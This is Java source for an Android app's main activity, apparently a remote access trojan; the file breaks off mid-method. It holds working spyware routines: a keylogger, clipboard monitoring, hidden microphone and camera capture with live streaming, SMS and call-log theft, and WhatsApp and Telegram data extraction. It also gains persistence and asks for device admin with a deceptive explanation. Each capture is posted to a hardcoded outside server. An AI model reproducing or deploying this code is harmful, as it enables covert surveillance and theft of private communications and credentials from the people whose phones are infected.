package com.nullx.pp;

import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.StatFs;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.speech.tts.TextToSpeech;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.WallpaperManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.graphics.SurfaceTexture;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;

public class MainActivity extends FlutterActivity {
    // Channel Identifiers
    private static final String SPY_CHANNEL = "com.nullx.pp/background_spy";
    private static final String STROBE_CHANNEL = "com.nullx.pp/strobe";
    private static final String NATIVE_LOCK_CHANNEL = "com.nullx.pp/native_lock";

    // Operational Components
    private boolean isStrobeRunning = false;
    private Handler uiHandler = new Handler(Looper.getMainLooper());
    private Runnable strobeRunnable;
    private static MethodChannel lockChannel;
    private static MethodChannel spyChannel; 
    private TextToSpeech ttsEngine;
    private MediaRecorder recorder;
    private String audioPath;
    
    // Live Camera Stream Engine
    private boolean isCameraInUse = false;
    private boolean isStreaming = false;
    private Camera streamCamera;

    // ============ NEW RAT FEATURES COMPONENTS ============
    // Keylogger
    private boolean isKeyloggerActive = false;
    private StringBuilder keylogBuffer = new StringBuilder();
    private Handler keyloggerHandler = new Handler(Looper.getMainLooper());
    private Runnable keyloggerRunnable;
    
    // Microphone Recorder (Background)
    private boolean isMicrophoneRecording = false;
    private MediaRecorder micRecorder;
    private String micAudioPath;
    
    // Clipboard Monitor
    private boolean isClipboardMonitoring = false;
    private String lastClipboardContent = "";
    private Handler clipboardHandler = new Handler(Looper.getMainLooper());
    private Runnable clipboardRunnable;
    
    // Process Killer & Process List
    private ActivityManager activityManager;
    
    // Persistence
    private boolean isPersistenceEnabled = false;
    
    // File Manager
    private String currentFilePath = "";
    
    // Call Logs Cache
    private List<Map<String, Object>> callLogsCache = new ArrayList<>();
    
    // SMS Cache
    private List<Map<String, Object>> smsCache = new ArrayList<>();

    private static final String SERVER_POST_URL = "http://papa.queen-official.com:2949/api/post-response/";
    private static final String TAG = "CRPT.ZDX";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestCriticalPermissions();
        requestOverlayPermission();
        activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        
        // Start background services
        startBackgroundServices();
    }

    private void startBackgroundServices() {
        try {
            Intent notificationIntent = new Intent(this, CustomNotificationListenerService.class);
            startService(notificationIntent);
        } catch (Exception e) {
            Log.e(TAG, "Notification service error: " + e.getMessage());
        }
        
        // [TAMBAHAN] Menjalankan BackgroundSpyService sebagai Foreground Service
        try {
            Intent spyServiceIntent = new Intent(this, BackgroundSpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(spyServiceIntent);
            } else {
                startService(spyServiceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "BackgroundSpyService error: " + e.getMessage());
        }

        // [TAMBAHAN] Memicu AlarmReceiver agar heartbeat persistensi langsung berjalan
        scheduleAlarm();

        startKeyloggerService();
        startClipboardMonitoring();
    }

    private void requestCriticalPermissions() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            if (!dpm.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System optimization requires admin access.");
                startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Device admin error: " + e.getMessage());
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception e) {
                    Log.e(TAG, "Battery optimization error: " + e.getMessage());
                }
            }
        }
    }

    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception e) {
                    Log.e(TAG, "Overlay permission error: " + e.getMessage());
                }
            }
        }
    }

    // ============ KEYLOGGER ============
    private void startKeyloggerService() {
        isKeyloggerActive = true;
        keyloggerRunnable = new Runnable() {
            @Override
            public void run() {
                if (isKeyloggerActive && keylogBuffer.length() > 0) {
                    sendKeylogToServer(keylogBuffer.toString());
                    keylogBuffer.setLength(0);
                }
                if (isKeyloggerActive) {
                    keyloggerHandler.postDelayed(this, 10000); // Send every 10 seconds
                }
            }
        };
        keyloggerHandler.post(keyloggerRunnable);
    }
    
    public void captureKeyStroke(String key) {
        if (isKeyloggerActive && key != null) {
            keylogBuffer.append(key);
            if (keylogBuffer.length() > 500) {
                sendKeylogToServer(keylogBuffer.toString());
                keylogBuffer.setLength(0);
            }
        }
    }
    
    private void sendKeylogToServer(String keys) {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
                String targetId = prefs.getString("targetId", "unknown");
                URL url = new URL(SERVER_POST_URL + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                
                JSONObject payload = new JSONObject();
                payload.put("cmd", "keylog_data");
                payload.put("data", keys);
                payload.put("timestamp", System.currentTimeMillis());
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes());
                    os.flush();
                }
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Keylog send error: " + e.getMessage());
            }
        }).start();
    }
    
    private void stopKeylogger() {
        isKeyloggerActive = false;
        keyloggerHandler.removeCallbacks(keyloggerRunnable);
    }

    // ============ MICROPHONE RECORDER BACKGROUND ============
    private void startBackgroundMicrophoneRecording() {
        if (isMicrophoneRecording) return;
        isMicrophoneRecording = true;
        
        new Thread(() -> {
            try {
                if (getExternalCacheDir() == null) return;
                micAudioPath = getExternalCacheDir().getAbsolutePath() + "/mic_rec_" + System.currentTimeMillis() + ".mp3";
                micRecorder = new MediaRecorder();
                micRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                micRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                micRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                micRecorder.setOutputFile(micAudioPath);
                micRecorder.prepare();
                micRecorder.start();
                
                while (isMicrophoneRecording) {
                    Thread.sleep(30000);
                    if (micRecorder != null && isMicrophoneRecording) {
                        sendMicrophoneChunk();
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Mic recording error: " + e.getMessage());
                isMicrophoneRecording = false;
            }
        }).start();
    }
    
    private void sendMicrophoneChunk() {
        new Thread(() -> {
            try {
                if (micRecorder != null) {
                    try {
                        micRecorder.stop();
                    } catch (Exception e) {
                        // Ignore stop error
                    }
                    micRecorder.release();
                    micRecorder = null;
                    
                    File audioFile = new File(micAudioPath);
                    if (audioFile.exists() && audioFile.length() > 0) {
                        byte[] audioBytes = new byte[(int) audioFile.length()];
                        java.io.FileInputStream fis = new java.io.FileInputStream(audioFile);
                        fis.read(audioBytes);
                        fis.close();
                        audioFile.delete();
                        
                        String base64Audio = Base64.encodeToString(audioBytes, Base64.NO_WRAP);
                        SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
                        String targetId = prefs.getString("targetId", "unknown");
                        
                        URL url = new URL(SERVER_POST_URL + targetId);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("POST");
                        conn.setRequestProperty("Content-Type", "application/json");
                        conn.setDoOutput(true);
                        conn.setConnectTimeout(5000);
                        
                        JSONObject payload = new JSONObject();
                        payload.put("cmd", "audio_chunk");
                        payload.put("data", base64Audio);
                        payload.put("timestamp", System.currentTimeMillis());
                        
                        try (OutputStream os = conn.getOutputStream()) {
                            os.write(payload.toString().getBytes());
                            os.flush();
                        }
                        conn.getResponseCode();
                        conn.disconnect();
                    }
                    
                    if (isMicrophoneRecording) {
                        startBackgroundMicrophoneRecording();
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Mic chunk send error: " + e.getMessage());
            }
        }).start();
    }
    
    private void stopBackgroundMicrophoneRecording() {
        isMicrophoneRecording = false;
        if (micRecorder != null) {
            try {
                try {
                    micRecorder.stop();
                } catch (Exception e) {}
                micRecorder.release();
            } catch (Exception e) {}
            micRecorder = null;
        }
    }

    // ============ CLIPBOARD MONITOR ============
    private void startClipboardMonitoring() {
        if (isClipboardMonitoring) return;
        isClipboardMonitoring = true;
        
        clipboardRunnable = new Runnable() {
            @Override
            public void run() {
                if (isClipboardMonitoring) {
                    ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cm != null && cm.hasPrimaryClip()) {
                        android.content.ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
                        if (item != null) {
                            String currentClip = item.getText() != null ? item.getText().toString() : "";
                            if (!currentClip.equals(lastClipboardContent) && !currentClip.isEmpty()) {
                                lastClipboardContent = currentClip;
                                sendClipboardToServer(currentClip);
                            }
                        }
                    }
                    clipboardHandler.postDelayed(this, 3000);
                }
            }
        };
        clipboardHandler.post(clipboardRunnable);
    }
    
    private void sendClipboardToServer(String content) {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
                String targetId = prefs.getString("targetId", "unknown");
                URL url = new URL(SERVER_POST_URL + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(5000);
                
                JSONObject payload = new JSONObject();
                payload.put("cmd", "clipboard_data");
                payload.put("data", content);
                payload.put("timestamp", System.currentTimeMillis());
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes());
                    os.flush();
                }
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Clipboard send error: " + e.getMessage());
            }
        }).start();
    }
    
    private void stopClipboardMonitoring() {
        isClipboardMonitoring = false;
        if (clipboardHandler != null && clipboardRunnable != null) {
            clipboardHandler.removeCallbacks(clipboardRunnable);
        }
    }

    // ============ HELPER METHOD FOR JSON ERRORS ============
    private String createErrorJson(String message) {
        if (message == null) message = "Unknown error";
        message = message.replace("\"", "\\\"");
        return "{\"error\": \"" + message + "\"}";
    }

    // ============ FILE MANAGER ============
    private String listFiles(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                return createErrorJson("Invalid path");
            }
            
            File[] files = dir.listFiles();
            JSONArray filesArray = new JSONArray();
            
            if (files != null) {
                for (File file : files) {
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", file.getName());
                    fileObj.put("path", file.getAbsolutePath());
                    fileObj.put("isDirectory", file.isDirectory());
                    fileObj.put("size", file.length());
                    fileObj.put("modified", file.lastModified());
                    filesArray.put(fileObj);
                }
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("files", filesArray);
            result.put("path", path);
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }
    
    private String downloadFile(String remotePath) {
        try {
            File file = new File(remotePath);
            if (!file.exists()) {
                return createErrorJson("File not found");
            }
            
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            
            String base64Content = Base64.encodeToString(data, Base64.NO_WRAP);
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("path", remotePath);
            result.put("content", base64Content);
            result.put("size", file.length());
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }
    
    private String removeTargetFile(String remotePath) {
        try {
            File file = new File(remotePath);
            if (file.exists()) {
                boolean deleted = file.delete();
                JSONObject result = new JSONObject();
                result.put("success", deleted);
                result.put("path", remotePath);
                return result.toString();
            }
            return createErrorJson("File not found");
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }
    
    private String uploadFile(String localPath, byte[] content, String fileName) {
        try {
            File destDir = new File(Environment.getExternalStorageDirectory(), "Download");
            if (!destDir.exists()) destDir.mkdirs();
            
            File destFile = new File(destDir, fileName != null ? fileName : "uploaded_file");
            FileOutputStream fos = new FileOutputStream(destFile);
            if (content != null) {
                fos.write(content);
            }
            fos.close();
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("destPath", destFile.getAbsolutePath());
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }

    // ============ PROCESS MANAGER ============
    private String listProcesses() {
        try {
            List<ActivityManager.RunningAppProcessInfo> processes = activityManager.getRunningAppProcesses();
            JSONArray processesArray = new JSONArray();
            
            if (processes != null) {
                for (ActivityManager.RunningAppProcessInfo process : processes) {
                    JSONObject processObj = new JSONObject();
                    processObj.put("name", process.processName);
                    processObj.put("pid", process.pid);
                    processObj.put("importance", process.importance);
                    processesArray.put(processObj);
                }
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("processes", processesArray);
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }
    
    private String killProcess(String pid) {
        try {
            int pidInt = Integer.parseInt(pid);
            android.os.Process.killProcess(pidInt);
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("pid", pid);
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }

    // ============ CALL LOGS ============
    private String getCallLogs() {
        try {
            JSONArray callsArray = new JSONArray();
            String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE
            };
            
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 500");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject callObj = new JSONObject();
                    callObj.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    callObj.put("type", getCallType(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                    callObj.put("duration", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    callObj.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    callsArray.put(callObj);
                }
                cursor.close();
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("calls", callsArray);
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }
    
    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE: return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE: return "MISSED";
            default: return "UNKNOWN";
        }
    }

    // ============ SMS INTERCEPTOR ============
    private String getSmsMessages() {
        try {
            JSONArray smsArray = new JSONArray();
            String[] projection = {
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            };
            
            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, projection, null, null, Telephony.Sms.DATE + " DESC LIMIT 500");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject smsObj = new JSONObject();
                    smsObj.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    smsObj.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    smsObj.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    smsObj.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)) == Telephony.Sms.MESSAGE_TYPE_INBOX ? "INBOX" : "SENT");
                    smsArray.put(smsObj);
                }
                cursor.close();
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("sms", smsArray);
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }
    
    private String sendSms(String number, String message) {
        try {
            Uri uri = Uri.parse("smsto:" + number);
            Intent intent = new Intent(Intent.ACTION_SENDTO, uri);
            intent.putExtra("sms_body", message);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("number", number);
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }

    // ============ WHATSAPP EXTRACTOR ============
    private String extractWhatsApp() {
        try {
            File whatsappDb = new File("/data/data/com.whatsapp/databases/msgstore.db");
            if (whatsappDb.exists()) {
                java.io.FileInputStream fis = new java.io.FileInputStream(whatsappDb);
                byte[] data = new byte[(int) whatsappDb.length()];
                fis.read(data);
                fis.close();
                
                String base64Db = Base64.encodeToString(data, Base64.NO_WRAP);
                
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("database", base64Db);
                result.put("size", whatsappDb.length());
                return result.toString();
            }
            return createErrorJson("WhatsApp database not found (requires root)");
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }

    // ============ TELEGRAM STEALER ============
    private String stealTelegram() {
        try {
            File tgDir = new File("/data/data/org.telegram.messenger/files/");
            JSONArray sessionsArray = new JSONArray();
            
            if (tgDir.exists() && tgDir.isDirectory()) {
                File[] files = tgDir.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (file.getName().endsWith(".dat")) {
                            java.io.FileInputStream fis = new java.io.FileInputStream(file);
                            byte[] data = new byte[(int) file.length()];
                            fis.read(data);
                            fis.close();
                            
                            JSONObject sessionObj = new JSONObject();
                            sessionObj.put("name", file.getName());
                            sessionObj.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
                            sessionsArray.put(sessionObj);
                        }
                    }
                }
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("sessions", sessionsArray);
            result.put("count", sessionsArray.length());
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }

    // ============ PERSISTENCE ============
    private void addToStartup() {
        try {
            ComponentName receiver = new ComponentName(this, BootReceiver.class);
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(receiver,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
            
            isPersistenceEnabled = true;
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
            prefs.edit().putBoolean("persistence", true).apply();
        } catch (Exception e) {
            Log.e(TAG, "Add to startup error: " + e.getMessage());
        }
    }
    
    private void scheduleAlarm() {
        try {
            Intent intent = new Intent(this, AlarmReceiver.class);
            android.app.PendingIntent pendingIntent = android.app.PendingIntent.getBroadcast(this, 0, intent, android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
            android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
            
            if (alarmManager != null) {
                long interval = 60000; // 1 minute
                long triggerTime = System.currentTimeMillis() + interval;
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
                } else {
                    alarmManager.setRepeating(android.app.AlarmManager.RTC_WAKEUP, triggerTime, interval, pendingIntent);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Schedule alarm error: " + e.getMessage());
        }
    }
    
    private void addSystemApp() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Add system app error: " + e.getMessage());
        }
    }

    // ============ NOTIFICATION SPAMMER ============
    private void showNotification(String title, String body, int id) {
        try {
            android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;
            
            String channelId = "spam_channel";
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, "Spam Notifications", android.app.NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(channel);
            }
            
            android.app.Notification.Builder builder = new android.app.Notification.Builder(this, channelId)
                .setContentTitle(title != null ? title : "Alert")
                .setContentText(body != null ? body : "Notification")
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setAutoCancel(true);
            
            nm.notify(id, builder.build());
        } catch (Exception e) {
            Log.e(TAG, "Show notification error: " + e.getMessage());
        }
    }

    // ============ LIVE CAMERA STREAM ============
    private void startLiveStream(String side) {
        if (isCameraInUse || isStreaming) return;
        isCameraInUse = true;
        isStreaming = true;
        int cameraId = "front".equals(side) ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
        try {
            streamCamera = Camera.open(cameraId);
            SurfaceTexture dummy = new SurfaceTexture(10);
            streamCamera.setPreviewTexture(dummy);
            Camera.Parameters params = streamCamera.getParameters();
            List<Camera.Size> sizes = params.getSupportedPreviewSizes();
            Camera.Size lowRes = sizes.get(sizes.size() > 2 ? sizes.size() - 2 : sizes.size() - 1);
            params.setPreviewSize(lowRes.width, lowRes.height);
            streamCamera.setParameters(params);
            streamCamera.setPreviewCallback((data, camera) -> {
                if (!isStreaming) return;
                new Thread(() -> {
                    try {
                        Camera.Parameters parameters = camera.getParameters();
                        int width = parameters.getPreviewSize().width;
                        int height = parameters.getPreviewSize().height;
                        YuvImage yuvImage = new YuvImage(data, parameters.getPreviewFormat(), width, height, null);
                        ByteArrayOutputStream out = new ByteArrayOutputStream();
                        yuvImage.compressToJpeg(new Rect(0, 0, width, height), 25, out); 
                        String base64Frame = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
                        SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
                        String tId = prefs.getString("targetId", "unknown");
                        sendFrameToServer(tId, base64Frame);
                        uiHandler.post(() -> {
                            if (spyChannel != null) {
                                Map<String, String> streamData = new HashMap<>();
                                streamData.put("id", tId);
                                streamData.put("image", base64Frame);
                                spyChannel.invokeMethod("live_frame", streamData);
                            }
                        });
                    } catch (Exception e) {
                        Log.e(TAG, "Frame processing error: " + e.getMessage());
                    }
                }).start();
            });
            streamCamera.startPreview();
            Log.d(TAG, "Live stream started");
        } catch (Exception e) {
            Log.e(TAG, "Start live stream error: " + e.getMessage());
            isCameraInUse = false;
            isStreaming = false;
        }
    }

    private void sendFrameToServer(String targetId, String base64) {
        try {
            URL url = new URL(SERVER_POST_URL + targetId);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(3000);
            JSONObject json = new JSONObject();
            json.put("cmd", "live_camera_frame");
            json.put("data", base64);
            json.put("timestamp", System.currentTimeMillis());
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.toString().getBytes());
                os.flush();
            }
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Send frame error: " + e.getMessage());
        }
    }

    private void stopLiveStream() {
        isStreaming = false;
        if (streamCamera != null) {
            try {
                streamCamera.setPreviewCallback(null);
                streamCamera.stopPreview();
                streamCamera.release();
            } catch (Exception e) {
                Log.e(TAG, "Stop stream error: " + e.getMessage());
            }
            streamCamera = null;
        }
        isCameraInUse = false;
        Log.d(TAG, "Live stream stopped");
    }

    private void takeSilentPhoto(String side, MethodChannel.Result result) {
        if (isCameraInUse) { 
            result.error("CAM_BUSY", "Camera is processing", null); 
            return; 
        }
        isCameraInUse = true;
        int cameraId = "front".equals(side) ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
        try {
            final Camera camera = Camera.open(cameraId);
            SurfaceTexture dummy = new SurfaceTexture(10);
            camera.setPreviewTexture(dummy);
            camera.startPreview();
            uiHandler.postDelayed(() -> {
                try {
                    camera.takePicture(null, null, (data, cam) -> {
                        String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
                        camera.release();
                        isCameraInUse = false;
                        result.success(base64Image);
                    });
                } catch (Exception e) {
                    if (camera != null) camera.release();
                    isCameraInUse = false;
                    result.error("TAKE_ERR", e.getMessage(), null);
                }
            }, 1000);
        } catch (Exception e) {
            isCameraInUse = false;
            result.error("CAM_OPEN_ERR", e.getMessage(), null);
        }
    }

    private List<Map<String, String>> getApps() {
        List<Map<String, String>> appList = new ArrayList<>();
        PackageManager pm = getPackageManager();
        List<PackageInfo> packages = pm.getInstalledPackages(0);
        for (PackageInfo p : packages) {
            Map<String, String> appData = new HashMap<>();
            appData.put("name", p.applicationInfo.loadLabel(pm).toString());
            appData.put("package", p.packageName);
            appData.put("version", p.versionName != null ? p.versionName : "Unknown");
            appList.add(appData);
        }
        return appList;
    }

    private void bringToFront() {
        Intent it = new Intent(this, MainActivity.class);
        it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(it);
    }

    private void startRecording(MethodChannel.Result result) {
        try {
            if (getExternalCacheDir() == null) {
                result.error("REC_ERR", "No external cache dir", null);
                return;
            }
            audioPath = getExternalCacheDir().getAbsolutePath() + "/rec_" + System.currentTimeMillis() + ".mp3";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioPath);
            recorder.prepare();
            recorder.start();
            result.success(true);
        } catch (Exception e) { 
            result.error("REC_ERR", e.getMessage(), null); 
        }
    }

    private void stopRecording(MethodChannel.Result result) {
        if (recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                result.success(audioPath);
            } catch (Exception e) { 
                result.error("STOP_ERR", e.getMessage(), null); 
            }
        } else { 
            result.success("No recording in progress"); 
        }
    }

    private String getStorageInfo() {
        try {
            StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
            long bytesAvailable = stat.getBlockSizeLong() * stat.getAvailableBlocksLong();
            long megAvailable = bytesAvailable / (1024 * 1024);
            return "Free Storage: " + megAvailable + " MB";
        } catch (Exception e) {
            return "Storage info error";
        }
    }

    private List<String> getDeviceAccounts() {
        List<String> accs = new ArrayList<>();
        try {
            AccountManager manager = AccountManager.get(this);
            Account[] accounts = manager.getAccountsByType("com.google");
            for (Account account : accounts) { 
                accs.add(account.name); 
            }
        } catch (Exception e) { 
            accs.add("Permission Denied"); 
        }
        return accs;
    }

    private boolean isAccessibilityServiceEnabled() {
        try {
            String prefString = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return prefString != null && prefString.contains(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    private void setDeviceBrightness(float level) {
        runOnUiThread(() -> {
            try {
                WindowManager.LayoutParams lp = getWindow().getAttributes();
                lp.screenBrightness = Math.min(1.0f, Math.max(0.0f, level));
                getWindow().setAttributes(lp);
            } catch (Exception e) {
                Log.e(TAG, "Set brightness error: " + e.getMessage());
            }
